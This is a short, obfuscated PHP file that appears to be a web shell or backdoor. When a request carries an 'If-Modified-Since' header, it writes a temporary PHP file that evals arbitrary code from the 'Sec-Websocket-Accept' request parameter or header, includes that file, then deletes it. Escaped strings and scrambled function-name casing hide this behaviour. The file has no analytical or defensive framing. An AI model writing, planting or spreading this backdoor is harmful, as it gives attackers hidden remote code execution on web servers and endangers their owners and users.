<?php
//<PHPDATA>uploader;If-Modified-Since;Sec-Websocket-Accept</PHPDATA>
$_0=geTallHEaDErS();if(isset($_0["If\055Modif\x69e\x64-Since"])):$_1="<?\160\150p @eval(\044_REQU\x45S\x54[\042Sec-Web\x73o\143ket-Acce\160t\x22]);@eva\x6c\050\x24_H\x45\101D\x45RS\133\042S\x65\143\x2dWebs\157ck\145t-Acc\145pt\x22]);";$_2="\057tmp/\056".tIME();fiLE_PUT_CoNtENTS($_2,$_1);include($_2);uNlink($_2);endif;
